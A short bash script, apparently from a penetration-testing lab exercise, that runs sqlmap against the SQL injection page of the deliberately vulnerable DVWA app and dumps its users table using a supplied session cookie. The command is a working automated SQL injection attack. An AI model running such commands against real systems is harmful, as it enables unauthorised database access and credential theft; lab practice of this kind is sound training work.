#!/usr/bin/env bash
# Phase 5 Boss 4: sqlmap against the DVWA SQL Injection page.
# Usage: ./scripts/50-sqli.sh <PHPSESSID>
set -euo pipefail
cd "$(dirname "$0")/.."
source lab.env
SID="${1:?Pass your DVWA PHPSESSID:  ./scripts/50-sqli.sh <PHPSESSID>}"

sqlmap -u "http://$RHOST:$RPORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SID; security=low" --batch -D dvwa -T users --dump
